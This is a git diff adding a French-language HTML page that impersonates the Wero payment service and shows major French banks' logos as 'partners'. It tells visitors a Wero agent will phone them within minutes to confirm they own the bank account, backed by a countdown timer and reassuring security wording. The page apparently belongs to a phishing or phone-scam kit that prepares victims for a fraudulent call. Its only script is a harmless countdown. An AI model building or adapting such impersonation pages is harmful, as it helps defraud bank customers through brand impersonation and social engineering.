@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - Validation en cours</title>
+    <!-- Chargement des polices d'écriture Poppins et Montserrat -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- En-tête identique avec logo et menu -->
+        <header class="app-header">
+            <div class="logo-container">
+                <img src="flavicon.ico" alt="Wero" class="app-logo">
+            </div>
+            <button class="menu-hamburger" aria-label="Menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </header>
+
+        <!-- Contenu principal de validation -->
+        <main class="app-content validation-page-content">
+            
+            <h1 class="validation-main-title">PAIEMENT SANS PRISE DE TÊTE</h1>
+
+            <!-- Petit badge vert coché -->
+            <div class="status-badge-green">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+
+            <h2 class="validation-subtitle">Transaction en attente de confirmation</h2>
+            
+            <p class="timer-label">Temps estimé avant l'appel :</p>
+
+            <!-- Bloc Compte à rebours dynamique -->
+            <div class="countdown-container">
+                <div class="countdown-block">
+                    <span id="countdown-minutes" class="countdown-number">09</span>
+                    <span class="countdown-text">Minutes</span>
+                </div>
+                <div class="countdown-block">
+                    <span id="countdown-seconds" class="countdown-number">32</span>
+                    <span class="countdown-text">Seconds</span>
+                </div>
+            </div>
+
+            <!-- Loader de chargement infini en cercle ouvert vert -->
+            <div class="infinite-loader-container">
+                <svg class="spinning-loader-svg" viewBox="0 0 50 50">
+                    <circle class="loader-path" cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
+                </svg>
+            </div>
+            
+            <!-- Badge Téléphone Rose/Rouge -->
+            <div class="status-badge-pink">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M6.62 10.79a15.15 15.15 0 006.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+                </svg>
+            </div>
+
+            <p class="validation-paragraph">
+                Un agent <strong>Wero</strong> vous contactera par téléphone dans les prochaines minutes (généralement sous <strong>2 à 5 minutes</strong>) afin de confirmer que vous êtes bien le/la titulaire du compte bancaire associé à votre profil.
+            </p>
+
+            <p class="validation-paragraph">
+                Cette étape ne prend que quelques instants et permet de s'assurer que vos fonds seront transférés en toute sécurité, uniquement vers un compte vérifié.
+            </p>
+
+            <!-- Badge Cadenas Orange -->
+            <div class="status-badge-orange">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                </svg>
+            </div>
+
+            <p class="validation-paragraph em-text">
+                Pour garantir la sécurité de vos transactions, une vérification rapide et confidentielle est en cours.
+            </p>
+
+            
+
+            <!-- Deuxième petit badge vert coché -->
+            <div class="status-badge-green spacing-top">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+
+            <!-- Bloc d'explication final mis en valeur -->
+            <p class="validation-paragraph final-notice-text">
+                <strong>Merci pour votre patience — cette mesure protège votre argent et prévient toute utilisation frauduleuse du système. Vous n'avez rien à faire, restez simplement disponible pour l'appel.</strong>
+            </p>
+
+        </main>
+
+        <!-- Pied de page avec le label "NOS PARTENAIRES" de la photo -->
+        <footer class="app-footer">
+            <p class="footer-text-label horizontal-bold">NOS PARTENAIRES</p>
+            <div class="partners-row">
+                <img src="Societe-Generale-Emblem.png" alt="Société Générale" class="partner-icon">
+                <img src="Banquepopulaire_logo.svg.webp" alt="Banque Populaire" class="partner-icon">
+                <img src="logo_BanquePostale_600x300.webp" alt="La Banque Postale" class="partner-icon">
+                <img src="12895685.png" alt="Caisse d'Épargne" class="partner-icon">
+                <img src="IMG_9197.png" alt="Crédit Agricole" class="partner-icon">
+                <img src="unnamed.jpg" alt="Crédit Mutuel" class="partner-icon">
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- Script optionnel pour faire descendre le chrono en temps réel -->
+    <script>
+        let minutes = 9;
+        let seconds = 32;
+        const minEl = document.getElementById('countdown-minutes');
+        const secEl = document.getElementById('countdown-seconds');
+
+        setInterval(() => {
+            if (seconds > 0) {
+                seconds--;
+            } else {
+                if (minutes > 0) {
+                    minutes--;
+                    seconds = 59;
+                }
+            }
+            minEl.textContent = minutes < 10 ? '0' + minutes : minutes;
+            secEl.textContent = seconds < 10 ? '0' + seconds : seconds;
+        }, 1000);
+    </script>
+</body>
+</html>
